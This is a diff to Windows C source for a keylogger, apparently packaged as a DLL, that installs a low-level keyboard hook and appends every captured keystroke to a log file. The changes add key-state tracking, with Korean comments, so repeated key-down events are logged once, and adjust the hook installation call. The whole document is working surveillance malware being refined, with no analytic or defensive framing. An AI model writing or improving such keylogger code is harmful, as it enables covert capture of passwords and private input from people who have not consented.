@@ -1,9 +1,11 @@
 #include <windows.h>
 #include <stdio.h>
+#include <stdbool.h>
 
 #define LOG_FILE "C:\\Users\\namkg\\Desktop\\keylog_dll.txt"
 
 static HHOOK g_hHook = NULL;
+static bool g_keyDown[256] = {false};  // 키 다운 상태 추적
 
 void LogKey(int vkCode) {
     FILE* fp = fopen(LOG_FILE, "a");
@@ -24,10 +26,19 @@ void LogKey(int vkCode) {
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
+        int vkCode = pKb->vkCode;
         
-        // 키가 눌렸을 때만 (떼어질 때는 무시)
+        // 키가 눌렸을 때
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
-            LogKey(pKb->vkCode);
+            // 이전에 안 눌린 키만 기록
+            if (!g_keyDown[vkCode]) {
+                LogKey(vkCode);
+                g_keyDown[vkCode] = true;
+            }
+        }
+        // 키가 떼어졌을 때
+        else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
+            g_keyDown[vkCode] = false;
         }
     }
     
@@ -37,18 +48,16 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 DWORD WINAPI HookThread(LPVOID param) {
     FILE* fp = fopen(LOG_FILE, "a");
     if (fp) {
-        fprintf(fp, "\n=== Keylogger Started (PID: %d, Hook Method) ===\n", GetCurrentProcessId());
+        fprintf(fp, "\n=== Keylogger Started (PID: %d) ===\n", GetCurrentProcessId());
         fclose(fp);
     }
 
-    // 키보드 후킹 설치
-    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
+    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     
     if (!g_hHook) {
         return 1;
     }
 
-    // 메시지 루프
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
